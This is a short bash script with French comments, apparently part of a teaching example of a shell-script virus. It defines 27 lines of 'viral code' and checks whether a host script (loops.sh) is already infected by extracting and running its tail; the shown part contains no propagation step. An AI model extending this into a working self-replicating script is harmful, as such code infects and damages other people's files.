#!/bin/bash
L=27 # nombre de lignes de code viral
if [ ! -z $1 ] && [ $1 = "test" ]
then
echo "test" # affiche test quand c’est deja infecte
exit 0
fi
touch test.sh # fichier temporaire de test de surinfection
chmod u+x test.sh

# gestion de la surinfection
tail -n $L loops.sh > test.sh # on r´ecup`ere le code viral
t=$(echo -n $(./test.sh "test")) # execution test
echo $t
echo $L

if [ "$t" != "test" ]
then
echo "pas infecte"
fi
